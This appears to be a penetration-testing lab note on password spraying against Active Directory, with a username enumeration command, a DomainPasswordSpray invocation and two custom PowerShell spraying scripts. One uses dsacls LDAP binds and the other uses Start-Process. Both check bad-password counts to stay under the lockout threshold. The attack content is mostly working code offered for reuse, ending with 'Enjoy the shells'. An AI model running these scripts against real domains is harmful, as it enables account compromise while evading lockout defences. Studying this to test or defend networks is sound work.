# Active Directory Password Spraying

## Active Directory Password Spraying

This lab explores ways of password spraying against Active Directory accounts.

### Invoke-DomainSpray

{% code title="attacker\@victim" %}
```csharp
Get-ADUser -Properties name -Filter * | Select-Object -ExpandProperty name |  Out-File users.txt
type users.txt
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaS-IicO-gwknsxFmSX%2F-LaS-Z-2yoUohAqbiqyO%2FScreenshot%20from%202019-03-20%2021-29-13.png?alt=media\&token=d3b4c037-573c-4d27-888e-88e81a4623e7)

{% code title="attacker\@victim" %}
```csharp
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaS-IicO-gwknsxFmSX%2F-LaS0LGdKDgXjx_NERm2%2FScreenshot%20from%202019-03-20%2021-32-37.png?alt=media\&token=2a59658d-4f97-44a6-afa1-41841f5e3754)

### Spraying using dsacls

While I was poking around with dsacls for enumerating AD object permissions

I noticed that one could attempt to bind to LDAP using specific AD credentials, so a dirty AD password spraying POC came about:

{% code title="attacker\@victim" %}
```csharp
$domain = ((cmd /c set u)[-3] -split "=")[-1]
$pdc = ((nltest.exe /dcname:$domain) -split "\\\\")[1]
$lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1]
$password = "123456"

# (Get-Content users.txt)
"krbtgt","spotless" | % {
    $badPwdCount = Get-ADObject -SearchBase "cn=$_,cn=users,dc=$domain,dc=local" -Filter * -Properties badpwdcount -Server $pdc | Select-Object -ExpandProperty badpwdcount
    if ($badPwdCount -lt $lockoutBadPwdCount - 3) {
        $isInvalid = dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:$_@offense.local /passwd:$password | select-string -pattern "Invalid Credentials"
        if ($isInvalid -match "Invalid") {
            Write-Host "[-] Invalid Credentials for $_ : $password" -foreground red
        } else {
            Write-Host "[+] Working Credentials for $_ : $password" -foreground green
        }        
    }
}
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaNKkYmPfGSF80_tQUx%2F-LaNQokIjU3XkqUj39tP%2FScreenshot%20from%202019-03-20%2000-10-10.png?alt=media\&token=623bc176-aebd-4293-b12a-c01ff6d0724d)

### Spraying with Start-Process

Similarly to dsacls, it's possible to spray passwords with `Start-Process` cmdlet and the help of PowerView's cmdlets:

{% code title="spray-ldap.ps1" %}
```csharp
# will spray only users that currently have 0 bad password attempts
# dependency - powerview

function Get-BadPasswordCount {
    param(
        $username = "username",
        $domain = "offense.local"
    )
    $pdc = (get-netdomain -domain $domain).PdcRoleOwner
    $badPwdCount = (Get-NetUser $username -Domain $domain -DomainController $pdc.name).badpwdcount
    return $badPwdCount
}

$users = Get-netuser -properties samaccountname | Select-Object -ExpandProperty samaccountname
$domain = "offense.local"
$password = "123456"

Write-Host $users.Count users supplied; $users | % {
    $badPasswordCount = Get-BadPasswordCount -username $_ -Domain $domain
    if ($badPasswordCount -lt 0) {
        Write-Host Spraying : -NoNewline; Write-host -ForegroundColor Green " $_"
        $credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @("$domain\$_",(ConvertTo-SecureString -String $password -AsPlainText -Force))
        Start-Process cmd -Credential ($credentials)
    } else {
        Write-Host "Ignoring $_ with $badPasswordCount badPwdCount" -ForegroundColor Red
    }
}
```
{% endcode %}

Enjoy the shells:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LexNPdaQm0mXHWwhHU9%2F-LexQt0wsAetdUeTSSjD%2Fspraying.gif?alt=media\&token=a8ec548e-6765-4b3a-84e4-391e9e3edf8c)

### References

{% embed url="https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1" %}

{% embed url="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" %}
